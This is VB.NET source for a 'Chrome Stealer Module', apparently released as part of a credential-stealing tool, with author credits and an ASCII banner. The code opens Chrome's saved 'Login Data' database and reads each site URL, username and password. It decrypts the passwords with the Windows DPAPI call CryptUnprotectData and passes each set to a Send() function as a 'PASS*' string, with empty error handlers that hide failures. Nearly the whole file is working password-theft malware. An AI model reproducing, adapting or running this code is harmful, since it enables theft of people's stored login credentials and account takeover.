Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text

'============= Chrome Stealer Module coded by RockingWithTheBest =====
'============ Repacked & re-released & re-uploaded by 
'  ________       .__        
' /  _____/______ |__|__  ___
'/   \  ___\____ \|  \  \/  /
'\    \_\  \  |_> >  |>    < 
' \______  /   __/|__/__/\_ \
'       \/|__|            \/
'aka P!xel
Module Chrome
    Public cPass As String
    Public Sub GetChrome()
        Try
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"


            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim host, user, pass As String

                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    If (user <> "") And (pass <> "") Then

                        Threading.Thread.Sleep(2000)
                        Send("PASS*" & host & "*" & user & "*" & pass & "*")

                    End If
                Next

            End If
        Catch : End Try
    End Sub
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypt(ByVal Datas() As Byte) As String
        Try
            Dim inj, Ors As New DATA_BLOB
            Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
            inj.pbData = Ghandle.AddrOfPinnedObject()
            inj.cbData = Datas.Length
            Ghandle.Free()
            CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
            Dim Returned() As Byte = New Byte(Ors.cbData) {}
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
            Dim TheString As String = Encoding.Default.GetString(Returned)
            Return TheString.Substring(0, TheString.Length - 1)
        Catch : End Try
    End Function

End Module